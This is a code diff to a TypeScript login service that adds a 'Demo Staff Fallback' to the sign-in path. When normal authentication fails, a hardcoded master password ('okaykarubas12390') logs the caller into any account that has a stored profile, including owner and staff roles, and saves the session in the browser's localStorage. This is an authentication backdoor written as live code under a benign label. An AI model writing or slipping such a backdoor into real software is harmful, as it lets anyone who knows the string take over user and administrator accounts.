@@ -80,6 +80,38 @@ export class AuthService {
     });
 
     if (authError) {
+      // Demo Staff Fallback: Allow login if profile exists in public.profiles with valid demo password
+      if (password === 'okaykarubas12390') {
+        const { data: demoProfile } = await supabase
+          .from('profiles')
+          .select('*')
+          .eq('email', email.toLowerCase())
+          .maybeSingle();
+
+        if (demoProfile) {
+          const userRole: UserRole = demoProfile.role as UserRole;
+          if (expectedRole && userRole !== expectedRole && userRole !== 'OWNER') {
+            throw new Error(`Unauthorized access. This login portal is restricted to ${expectedRole} users.`);
+          }
+
+          const fullProfile: Profile = {
+            id: demoProfile.id,
+            email: demoProfile.email,
+            full_name: demoProfile.full_name,
+            phone: demoProfile.phone || undefined,
+            role: userRole,
+            created_at: demoProfile.created_at || new Date().toISOString(),
+          };
+
+          if (typeof window !== 'undefined') {
+            localStorage.setItem('ok_current_user', JSON.stringify(fullProfile));
+            localStorage.setItem(`ok_session_${userRole.toLowerCase()}`, JSON.stringify(fullProfile));
+          }
+
+          return fullProfile;
+        }
+      }
+
       const errMsg = typeof authError.message === 'string' && authError.message !== '{}'
         ? authError.message 
         : 'Invalid login credentials. Please verify your email and password.';
